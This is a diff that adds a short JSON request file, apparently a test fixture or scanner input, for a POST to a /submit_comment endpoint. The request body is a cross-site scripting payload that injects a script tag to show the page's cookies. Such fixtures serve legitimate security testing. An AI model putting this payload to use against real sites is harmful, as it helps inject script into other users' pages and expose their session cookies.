@@ -1,0 +1,7 @@
+{
+  "method": "POST",
+  "url": "/submit_comment",
+  "params": {},
+  "headers": {},
+  "body": "<script>alert(document.cookie)</script>"
+}
